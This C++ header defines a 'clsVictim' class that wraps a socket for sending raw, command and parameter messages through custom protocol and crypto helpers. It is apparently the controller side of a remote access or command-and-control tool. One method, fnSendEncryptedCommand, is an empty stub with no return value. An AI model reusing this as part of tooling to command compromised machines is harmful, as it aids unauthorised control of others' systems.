#include <arpa/inet.h>
#include <unistd.h>
#include <iostream>
#include <ostream>
#include <string>
#include <vector>

#include "clsEDP.hpp"
#include "clsTools.hpp"
#include "clsEZData.hpp"
#include "clsCrypto.hpp"

class clsVictim
{
private:
    clsCrypto m_crypto;
public:
    int m_nSkt;

public:
    clsVictim()
    {

    }
    clsVictim(int nSkt)
    {
        m_nSkt = nSkt;
    }
    clsVictim(int nSkt, clsCrypto crypto)
    {
        m_nSkt = nSkt;
        m_crypto = crypto;
    }

    ~clsVictim()
    {

    }

    ssize_t fnSend(std::string& szMsg)
    {
        std::vector<unsigned char> vuMsg(szMsg.begin(), szMsg.end());
        return fnSend(vuMsg);
    }
    ssize_t fnSend(std::vector<unsigned char> vuBuffer)
    {
        ssize_t nSent = send(m_nSkt, vuBuffer.data(), vuBuffer.size(), 0);
        return nSent;
    }

    ssize_t fnSendCommand(std::string& szMsg)
    {
        std::vector<unsigned char> vuMsg(szMsg.begin(), szMsg.end());
        return fnSend(vuMsg);
    }

    ssize_t fnSendEncryptedCommand(std::string& szMsg)
    {

    }

    ssize_t fnSendCmdParam(uint8_t nCommand, uint8_t nParam, uint nLength = 10)
    {
        std::string szFoo = clsEZData::fnszGenerateRandomStr(nLength);
        std::vector<unsigned char> vuBuffer(szFoo.begin(), szFoo.end());

        clsEDP edp(nCommand, nParam, vuBuffer);

        return fnSend(edp.fnabGetBytes());
    }
};